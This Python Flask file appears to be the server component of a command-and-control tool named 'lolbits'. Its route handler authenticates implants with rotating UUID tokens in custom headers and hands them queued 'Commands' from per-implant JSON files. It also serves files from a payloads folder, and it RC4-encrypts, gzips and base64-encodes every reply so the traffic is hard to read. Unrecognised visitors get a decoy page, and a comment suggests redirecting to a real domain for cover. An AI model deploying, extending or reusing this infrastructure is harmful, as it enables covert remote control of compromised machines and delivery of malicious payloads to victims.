from flask import Flask, url_for ,render_template,request,redirect
import json
from uuid import uuid4
import base64
import gzip
import array
import sys
import io
import os

app = Flask(__name__)


app.static_folder = 'static'


#Initial setup
InitialId = "<ident8>"
AuthPath = "C:\\inetpub\\wwwroot\\lolbits\\config\\auth.txt"
Contid = "7061796c676164"
RestoreKeys = [str(uuid4()),str(uuid4()),str(uuid4())]
ReadPath = "C:\\inetpub\\wwwroot\\lolbits\\files\\"
Password = "<ident4>"
Payloads = "C:\\inetpub\\wwwroot\\lolbits\\payloads\\"

@app.route('/', methods=['GET'])
def index():
    return render_template("index.html")

@app.route('/<id>', methods=['GET'])
def bar(id): 

    exist = True

    if "Reqid" in request.headers:

        with open(AuthPath,'r') as a:
            ath = json.load(a)

        if "Contid" in request.headers and request.headers['Reqid'] == ath['NextAuth'] and request.headers['Contid'] == Contid:
            path = request.path.replace('/','')
            filePath = Payloads + path
            return EncryptContent(filePath)

        elif request.headers['Reqid'] == ath['Auth'] or request.headers['Reqid'] == ath['NextAuth']:
            if request.headers['Reqid'] == ath['NextAuth']:
                ath['Auth'] = ath['NextAuth']
                ath['NextAuth'] = str(uuid4())
                with open(AuthPath,'w') as a:
                    json.dump(ath, a)
            
            path = request.path.replace('/','')
            filePath = ReadPath + path

            if not os.path.isfile(filePath):
                filePath = ReadPath + InitialId
                exist = False

            with open(filePath,'r') as f:
                content = json.load(f)

            content['NextAuth'] = ath['NextAuth']

            if not exist:
                content['NextId'] = path
                content['Commands'] = []

            with open(filePath, 'w') as f:
                json.dump(content, f)
            
           
            return EncryptContent(filePath)
 

    else:

        path = request.path.replace('/','')
        if path == InitialId:
            filePath = ReadPath + path
            with open(filePath,'r') as f:
                content = json.load(f)
            ath = {}    
            ath['Auth'] = str(uuid4()) 
            ath['NextAuth'] = str(uuid4())
            with open(AuthPath,'w') as a:
                json.dump(ath, a)


            content['NextAuth'] = ath['Auth']
            content['Commands'] = RestoreKeys
            with open(filePath, 'w') as f:
                json.dump(content, f)
            
            return EncryptContent(filePath)


    return render_template("index.html") # If you have a registered domain, its better this: return redirect("https://yourdomain", code=302)


def crypt(key, data):
    S = list(range(256))
    j = 0

    for i in list(range(256)):
        j = (j + S[i] + ord(key[i % len(key)])) % 256
        S[i], S[j] = S[j], S[i]

    j = 0
    y = 0
    out = []

    for char in data:
       j = (j + 1) % 256
       y = (y + S[j]) % 256
       S[j], S[y] = S[y], S[j]
       out.append(char ^ S[(S[j] + S[y]) % 256])
       
    return out

def lee_archivo(path):

    with open(path, "rb") as f:# read binary data
        s = f.read() # read all bytes into a string
    return array.array("B", s) 



def ByteToHex (bytestring):
    s = ''.join('{:02x}'.format(x) for x in bytestring)
    return s

def gzipstream ( string ):
    out = io.BytesIO()
    with gzip.GzipFile(fileobj=out, mode='w') as fo:
        fo.write(string.encode())
    bytes_obj = out.getvalue()
    return base64.b64encode(bytes_obj)

def EncryptContent(filePath):

    datos = lee_archivo(filePath)
    key = [ord(char) for char in Password]
    encriptado = crypt (Password, datos)
    bytearray_encriptado = encriptado
    hex_encriptado = ByteToHex(bytearray_encriptado)
    payload_encriptado = gzipstream(hex_encriptado)
    return payload_encriptado
	
if __name__ == '__main__':
    app.run(host='0.0.0.0',port=9010)
